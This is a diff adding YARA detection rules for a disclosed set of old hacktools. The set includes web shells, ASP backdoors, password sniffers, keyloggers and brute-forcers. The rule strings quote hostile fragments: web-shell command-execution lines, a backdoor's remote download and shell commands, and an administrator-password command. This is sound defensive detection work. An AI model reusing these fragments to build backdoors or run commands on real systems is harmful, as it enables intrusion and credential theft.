+		$s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
+		$s1 = "Http://www.coffeewl.com" fullword ascii
+		$s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
+		$s3 = "for /L %%a in (" fullword ascii
+		$s4 = "MODE con: COLS=42 lines=5" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_Burst_Blast {
+	meta:
+		description = "Disclosed hacktool set - file Blast.bat"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "b07702a381fa2eaee40b96ae2443918209674051"
+	strings:
+		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
+		$s1 = "@echo off" fullword ascii
+	condition:
+		all of them
+}
+
+rule VUBrute_VUBrute {
+	meta:
+		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
+		author = "Florian Roth"
+		date = "22.11.14"
+		score = 70
+		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
+	strings:
+		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
+		$s1 = "http://ubrute.com" fullword ascii
+		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
+		$s14 = "error.txt" fullword ascii
+	condition:
+		all of them
+}
+
+rule DK_Brute {
+	meta:
+		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
+		author = "Florian Roth"
+		date = "22.11.14"
+		score = 70
+		reference = "http://goo.gl/xiIphp"
+		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
+	strings:
+		$s6 = "get_CrackedCredentials" fullword ascii
+		$s13 = "Same port used for two different protocols:" fullword wide
+		$s18 = "coded by fLaSh" fullword ascii
+		$s19 = "get_grbToolsScaningCracking" fullword ascii
+	condition:
+		all of them
+}
+
+rule VUBrute_config {
+	meta:
+		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
+		author = "Florian Roth"
+		date = "22.11.14"
+		score = 70
+		reference = "http://goo.gl/xiIphp"
+		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
+	strings:
+		$s2 = "Restore=1" fullword ascii
+		$s6 = "Thread=" ascii
+		$s7 = "Running=1" fullword ascii
+		$s8 = "CheckCombination=" fullword ascii
+		$s10 = "AutoSave=1.000000" fullword ascii
+		$s12 = "TryConnect=" ascii
+		$s13 = "Tray=" ascii
+	condition:
+		all of them
+}
+
+rule sig_238_hunt {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file hunt.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
+	strings:
+		$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
+		$s3 = "Usage - hunt \\\\servername" fullword ascii
+		$s4 = ".share = %S - %S" fullword wide
+		$s5 = "SMB share enumerator and admin finder " fullword ascii
+		$s7 = "Hunt only runs on Windows NT..." fullword ascii
+		$s8 = "User = %S" fullword ascii
+		$s9 = "Admin is %s\\%s" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_listip {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file listip.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
+	strings:
+		$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
+		$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
+		$s4 = "Local Host Name: %s" fullword ascii
+		$s5 = "Packed by exe32pack 1.38" fullword ascii
+		$s7 = "Local Computer Name: %s" fullword ascii
+		$s8 = "Local IP Adress: %s" fullword ascii
+	condition:
+		all of them
+}
+
+rule ArtTrayHookDll {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
+	strings:
+		$s0 = "ArtTrayHookDll.dll" fullword ascii
+		$s7 = "?TerminateHook@@YAXXZ" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_eee {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file eee.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
+	strings:
+		$s0 = "szj1230@yesky.com" fullword wide
+		$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
+		$s4 = "MailTo:szj1230@yesky.com" fullword wide
+		$s5 = "Command1_Click" fullword ascii
+		$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
+		$s11 = "vb5chs.dll" fullword ascii
+		$s12 = "MSVBVM50.DLL" fullword ascii
+	condition:
+		all of them
+}
+
+rule aspbackdoor_asp4 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file asp4.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "faf991664fd82a8755feb65334e5130f791baa8c"
+	strings:
+		$s0 = "system.dll" fullword ascii
+		$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
+		$s3 = "Public Function reboot(atype As Variant)" fullword ascii
+		$s4 = "t& = ExitWindowsEx(1, atype)" ascii
+		$s5 = "atype=request(\"atype\") " fullword ascii
+		$s7 = "AceiveX dll" fullword ascii
+		$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
+		$s10 = "sys.reboot(atype)" fullword ascii
+	condition:
+		all of them
+}
+
+rule aspfile1 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
+	strings:
+		$s0 = "' -- check for a command that we have posted -- '" fullword ascii
+		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
+		$s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
+		$s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
+		$s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
+		$s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
+	condition:
+		3 of them
+}
+
+rule EditServer {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
+	strings:
+		$s0 = "%s Server.exe" fullword ascii
+		$s1 = "Service Port: %s" fullword ascii
+		$s2 = "The Port Must Been >0 & <65535" fullword ascii
+		$s8 = "3--Set Server Port" fullword ascii
+		$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
+		$s13 = "Service Name: %s" fullword ascii
+		$s14 = "Server Password: %s" fullword ascii
+		$s17 = "Inject Process Name: %s" fullword ascii
+		
+		$x1 = "WinEggDrop Shell Congirator" fullword ascii
+	condition:
+		5 of ($s*) or $x1 
+}
+
+rule sig_238_letmein {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file letmein.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
+	strings:
+		$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
+		$s6 = "Error get users from server!" fullword ascii
+		$s7 = "get in nt by name and null" fullword ascii
+		$s16 = "get something from nt, hold by killusa." fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_token {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file token.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
+	strings:
+		$s0 = "Logon.exe" fullword ascii
+		$s1 = "Domain And User:" fullword ascii
+		$s2 = "PID=Get Addr$(): One" fullword ascii
+		$s3 = "Process " fullword ascii
+		$s4 = "psapi.dllK" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_TELNET {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
+	strings:
+		$s0 = "TELNET [host [port]]" fullword wide
+		$s2 = "TELNET.EXE" fullword wide
+		$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
+		$s14 = "Software\\Microsoft\\Telnet" fullword wide
+	condition:
+		all of them
+}
+
+rule snifferport {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "d14133b5eaced9b7039048d0767c544419473144"
+	strings:
+		$s0 = "iphlpapi.DLL" fullword ascii
+		$s5 = "ystem\\CurrentCorolSet\\" fullword ascii
+		$s11 = "Port.TX" fullword ascii
+		$s12 = "32Next" fullword ascii
+		$s13 = "V1.2 B" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_webget {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file webget.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
+	strings:
+		$s0 = "Packed by exe32pack" ascii
+		$s1 = "GET A HTTP/1.0" fullword ascii
+		$s2 = " error " fullword ascii
+		$s13 = "Downloa" ascii
+	condition:
+		all of them
+}
+
+rule XYZCmd_zip_Folder_XYZCmd {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
+	strings:
+		$s0 = "Executes Command Remotely" fullword wide
+		$s2 = "XYZCmd.exe" fullword wide
+		$s6 = "No Client Software" fullword wide
+		$s19 = "XYZCmd V1.0 For NT S" fullword ascii
+	condition:
+		all of them
+}
+
+rule ASPack_Chinese {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
+	strings:
+		$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
+		$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
+		$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
+		$s8 = ";  Please, translate text only after simbol '='" fullword ascii
+		$s19 = "= Compress with ASPack" fullword ascii
+	condition:
+		all of them
+}
+
+rule aspbackdoor_EDIR {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
+	strings:
+		$s1 = "response.write \"<a href='index.asp'>" fullword ascii
+		$s3 = "if Request.Cookies(\"password\")=\"" ascii
+		$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
+		$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
+		$s19 = "whichdir=Request(\"path\")" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_filespy {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file filespy.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 50
+		hash = "89d8490039778f8c5f07aa7fd476170293d24d26"
+	strings:
+		$s0 = "Hit [Enter] to begin command mode..." fullword ascii
+		$s1 = "If you are in command mode," fullword ascii
+		$s2 = "[/l] lists all the drives the monitor is currently attached to" fullword ascii
+		$s9 = "FileSpy.exe" fullword wide
+		$s12 = "ERROR starting FileSpy..." fullword ascii
+		$s16 = "exe\\filespy.dbg" fullword ascii
+		$s17 = "[/d <drive>] detaches monitor from <drive>" fullword ascii
+		$s19 = "Should be logging to screen..." fullword ascii
+		$s20 = "Filmon:  Unknown log record type" fullword ascii
+	condition:
+		7 of them
+}
+
+rule ByPassFireWall_zip_Folder_Ie {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Ie.dll"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "d1b9058f16399e182c9b78314ad18b975d882131"
+	strings:
+		$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
+		$s1 = "LOADER ERROR" fullword ascii
+		$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
+		$s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
+	condition:
+		all of them
+}
+
+rule EditKeyLogReadMe {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
+	strings:
+		$s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
+		$s1 = "WinEggDrop.DLL" fullword ascii
+		$s2 = "nc.exe" fullword ascii
+		$s3 = "KeyLog.exe" fullword ascii
+		$s4 = "EditKeyLog.exe" fullword ascii
+		$s5 = "wineggdrop" fullword ascii
+	condition:
+		3 of them
+}
+
+rule PassSniffer_zip_Folder_readme {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file readme.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
+	strings:
+		$s0 = "PassSniffer.exe" fullword ascii
+		$s1 = "POP3/FTP Sniffer" fullword ascii
+		$s2 = "Password Sniffer V1.0" fullword ascii
+	condition:
+		1 of them
+}
+
+rule sig_238_gina {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file gina.reg"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
+	strings:
+		$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
+		$s1 = "REGEDIT4" fullword ascii
+		$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
+	condition:
+		all of them
+}
+
+rule splitjoin {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
+	strings:
+		$s0 = "Not for distribution without the authors permission" fullword wide
+		$s2 = "Utility to split and rejoin files.0" fullword wide
+		$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
+		$s19 = "SplitJoin" fullword wide
+	condition:
+		all of them
+}
+
+rule EditKeyLog {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
+	strings:
+		$s1 = "Press Any Ke" fullword ascii
+		$s2 = "Enter 1 O" fullword ascii
+		$s3 = "Bon >0 & <65535L" fullword ascii
+		$s4 = "--Choose " fullword ascii
+	condition:
+		all of them
+}
+
+rule PassSniffer {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
+	strings:
+		$s2 = "Sniff" fullword ascii
+		$s3 = "GetLas" fullword ascii
+		$s4 = "VersionExA" fullword ascii
+		$s10 = " Only RuntUZ" fullword ascii
+		$s12 = "emcpysetprintf\\" fullword ascii
+		$s13 = "WSFtartup" fullword ascii
+	condition:
+		all of them
+}
+
+rule aspfile2 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
+	strings:
+		$s0 = "response.write \"command completed success!\" " fullword ascii
+		$s1 = "for each co in foditems " fullword ascii
+		$s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
+		$s19 = "<title>Hello! Welcome </title>" fullword ascii
+	condition:
+		all of them
+}
+
+rule Jc_ALL_WinEggDropShell_rar_Folder_SOCKS {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file SOCKS.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "ad2168e9837592eeb120fc6798648b2fe996f79c"
+	strings:
+		$s0 = "http://go.163.com/~sdemo" fullword ascii
+		$s1 = "http://go.163.com/sdemo" fullword wide
+		$s4 = "Player.EXE" fullword wide
+		$s5 = "mailto:sdemo@263.net" fullword ascii
+		$s6 = "S-Player.exe" fullword ascii
+	condition:
+		all of them
+}
+
+rule UnPack_rar_Folder_InjectT {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
+	strings:
+		$s0 = "%s -Install                          -->To Install The Service" fullword ascii
+		$s1 = "Explorer.exe" fullword ascii
+		$s2 = "%s -Start                            -->To Start The Service" fullword ascii
+		$s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
+		$s4 = "The Port Is Out Of Range" fullword ascii
+		$s7 = "Fail To Set The Port" fullword ascii
+		$s11 = "\\psapi.dll" fullword ascii
+		$s20 = "TInject.Dll" fullword ascii
+		
+		$x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
+		$x2 = "injectt.exe" fullword ascii		
+	condition:
+		( 1 of ($x*) ) and ( 3 of ($s*) )
+}
+
+rule Jc_WinEggDrop_Shell {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
+	strings:
+		$s0 = "Sniffer.dll" fullword ascii
+		$s4 = ":Execute net.exe user Administrator pass" fullword ascii
+		$s5 = "Fport.exe or mport.exe " fullword ascii
+		$s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
+		$s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
+		$s15 = ": Del www.exe                   " fullword ascii
+		$s20 = ":Dir *.exe                    " fullword ascii
+	condition:
+		2 of them
+}
+
+rule aspbackdoor_asp1 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file asp1.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
+	strings:
+		$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
+		$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
+		$s6 = "set rs=conn.execute (sql)%> " fullword ascii
+		$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
+		$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
+		$s15 = "sql=\"select * from scjh\" " fullword ascii
+	condition:
+		all of them
+}
+
+rule QQ_zip_Folder_QQ {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file QQ.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
+	strings:
+		$s0 = "EMAIL:haoq@neusoft.com" fullword wide
+		$s1 = "EMAIL:haoq@neusoft.com" fullword wide
+		$s4 = "QQ2000b.exe" fullword wide
+		$s5 = "haoq@neusoft.com" fullword ascii
+		$s9 = "QQ2000b.exe" fullword ascii
+		$s10 = "\\qq2000b.exe" fullword ascii
+		$s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
+		$s17 = "SOFTWARE\\HAOQIANG\\" fullword ascii
+	condition:
+		5 of them
+}
+
+rule UnPack_rar_Folder_TBack {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
+	strings:
+		$s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
+		$s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
+		$s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
+		$s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
+		$s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
+		$s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
+		$s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
+		$s8 = "Shell                                 -->Get A Shell" fullword ascii
+		$s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
+		$s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
+		$s13 = "Online                                -->List All Connected IP" fullword ascii
+		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
+		$s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
+		$s18 = "Execute Program                       -->Execute A Program" fullword ascii
+		$s19 = "Reboot                                -->Reboot The System" fullword ascii
+		$s20 = "Password Sniffering Is Not Running" fullword ascii
+	condition:
+		4 of them
+}
+
+rule sig_238_cmd_2 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "be4073188879dacc6665b6532b03db9f87cfc2bb"
+	strings:
+		$s0 = "Process child = Runtime.getRuntime().exec(" ascii
+		$s1 = "InputStream in = child.getInputStream();" fullword ascii
+		$s2 = "String cmd = request.getParameter(\"" ascii
+		$s3 = "while ((c = in.read()) != -1) {" fullword ascii
+		$s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
+	condition:
+		all of them
+}
+
+rule RangeScan {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
+	strings:
+		$s0 = "RangeScan.EXE" fullword wide
+		$s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
+		$s9 = "Produced by isn0" fullword ascii
+		$s10 = "RangeScan" fullword wide
+		$s20 = "%d-%d-%d %d:%d:%d" fullword ascii
+	condition:
+		3 of them
+}
+
+rule XYZCmd_zip_Folder_Readme {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Readme.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
+	strings:
+		$s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
+		$s20 = "XYZCmd V1.0" fullword ascii
+	condition:
+		all of them
+}
+
+rule ByPassFireWall_zip_Folder_Inject {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Inject.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
+	strings:
+		$s6 = "Fail To Inject" fullword ascii
+		$s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
+		$s11 = " Successfully" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_sqlcmd {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 40
+		hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
+	strings:
+		$s0 = "Permission denial to EXEC command.:(" fullword ascii
+		$s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
+		$s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
+		$s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
+		$s6 = "SqlCmd2.exe Inside Edition." fullword ascii
+		$s7 = "Http://www.patching.net  2000/12/14" fullword ascii
+		$s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
+	condition:
+		4 of them
+}
+
+rule ASPack_ASPACK {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
+	strings:
+		$s0 = "ASPACK.EXE" fullword wide
+		$s5 = "CLOSEDFOLDER" fullword wide
+		$s10 = "ASPack compressor" fullword wide
+	condition:
+		all of them
+}
+
+rule sig_238_2323 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file 2323.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
+	strings:
+		$s0 = "port - Port to listen on, defaults to 2323" fullword ascii
+		$s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
+		$s3 = "Failed to execute shell" fullword ascii
+		$s5 = "/h   - Hide Window" fullword ascii
+		$s7 = "Accepted connection from client at %s" fullword ascii
+		$s9 = "Error %d: %s" fullword ascii
+	condition:
+		all of them
+}
+
+rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Install.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "95866e917f699ee74d4735300568640ea1a05afd"
+	strings:
+		$s1 = "http://go.163.com/sdemo" fullword wide
+		$s2 = "Player.tmp" fullword ascii
+		$s3 = "Player.EXE" fullword wide
+		$s4 = "mailto:sdemo@263.net" fullword ascii
+		$s5 = "S-Player.exe" fullword ascii
+		$s9 = "http://www.BaiXue.net (" fullword wide
+	condition:
+		all of them
+}
+
+rule sig_238_TFTPD32 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
+	strings:
+		$s0 = " http://arm.533.net" fullword ascii
+		$s1 = "Tftpd32.hlp" fullword ascii
+		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
+		$s3 = "TFTPD32 -- " fullword wide
+		$s4 = "%d -- %s" fullword ascii
+		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
+		$s12 = "TftpPort" fullword ascii
+		$s13 = "Ttftpd32BackGround" fullword ascii
+		$s17 = "SOFTWARE\\TFTPD32" fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_iecv {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file iecv.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "6e6e75350a33f799039e7a024722cde463328b6d"
+	strings:
+		$s1 = "Edit The Content Of Cookie " fullword wide
+		$s3 = "Accessories\\wordpad.exe" fullword ascii
+		$s4 = "gorillanation.com" fullword ascii
+		$s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
+		$s12 = "http://nirsoft.cjb.net" fullword ascii
+	condition:
+		all of them
+}
+
+rule Antiy_Ports_1_21 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
+	strings:
+		$s0 = "AntiyPorts.EXE" fullword wide
+		$s7 = "AntiyPorts MFC Application" fullword wide
+		$s20 = " @Stego:" fullword ascii
+	condition:
+		all of them
+}
+
+rule perlcmd_zip_Folder_cmd {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
+	strings:
+		$s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
+		$s1 = "s/%20/ /ig;" fullword ascii
+		$s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
+		$s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
+		$s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
+		$s6 = "$execthis = $_;" fullword ascii
+		$s7 = "system($execthis);" fullword ascii
+		$s12 = "s/%2f/\\//ig;" fullword ascii
+	condition:
+		6 of them
+}
+
+rule aspbackdoor_asp3 {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file asp3.txt"
+		author = "Florian Roth"
+		date = "23.11.14"
+		score = 60
+		hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
+	strings:
+		$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
+		$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
+		$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
+		$s14 = " Windows NT " fullword ascii
+		$s16 = " WIndows 2000 " fullword ascii
+		$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
+		$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
+		$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
+	condition:
+		all of them
+}
+
+rule sig_238_FPipe {
+	meta:
+		description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
+		author = "Florian Roth"
+		date = "23.11.14"
